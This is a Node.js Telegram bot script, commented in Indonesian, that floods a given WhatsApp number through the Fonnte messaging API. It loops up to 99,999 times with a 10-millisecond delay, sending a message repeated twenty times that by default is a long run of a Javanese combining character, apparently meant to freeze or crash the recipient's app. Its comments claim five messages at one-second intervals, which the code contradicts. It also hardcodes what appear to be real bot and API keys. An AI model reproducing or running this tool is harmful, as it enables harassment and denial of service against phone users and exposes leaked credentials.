// bot_kirim2.js
// npm install node-telegram-bot-api axios
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8499584477:AAEwTvcdjckwU_vHJ6C2dgUUfqoiKbmUFNQ';
const FONNTE_KEY    = process.env.FONNTE_KEY    || 'ctKBo8JdYJ3XqxPBD6Fg';
if(!TELEGRAM_TOKEN || !FONNTE_KEY){ console.error('Set TELEGRAM_TOKEN & FONNTE_KEY'); process.exit(1); }

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const make20 = txt => Array.from({length:20}).map(()=>txt).join('\n');
const sleep = ms => new Promise(r=>setTimeout(r,ms));

bot.on('message', async msg=>{
  try{
    const chatId = msg.chat.id;
    const t = (msg.text||'').trim();
    if(!t.startsWith('.kirim2')) return;
    // format: .kirim2 62812xxxx [isi pesan (optional)]
    const parts = t.split(/\s+/);
    const target = parts[1];
    const text = parts.slice(2).join(' ') || 'ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ  ꦽ ꦽ ꦽ ꦽ ꦽ ꦽ ';
    if(!target) return bot.sendMessage(chatId,'Format: .kirim2 62812xxxx [isi]');

    const payloadText = make20(text);

    // kirim 5 pesan, 1 detik jeda antar pesan
    const results = [];
    for (let i = 1; i <= 99999; i++) {
      try {
        const res = await axios.post('https://api.fonnte.com/send',
          { target: target.trim(), message: payloadText },
          { headers: { Authorization: FONNTE_KEY }, timeout: 20000 }
        );
        results.push({ i, ok: true, data: res.data });
        await bot.sendMessage(chatId, `Pesan ${i} queued: ${JSON.stringify(res.data)}`);
      } catch (e) {
        results.push({ i, ok: false, err: e?.response?.data || e.message });
        await bot.sendMessage(chatId, `Pesan ${i} gagal: ${JSON.stringify(e?.response?.data || e.message)}`);
      }
      await sleep(10); // delay 1 detik
    }

    // ringkasan singkat di akhir
    const successCount = results.filter(r=>r.ok).length;
    bot.sendMessage(chatId, `Selesai. ${successCount}/5 pesan queued berhasil.`);
  }catch(e){
    console.error(e?.response?.data || e.message);
    bot.sendMessage(msg.chat.id, '❌ Gagal mengirim. Cek API key / koneksi.');
  }
});
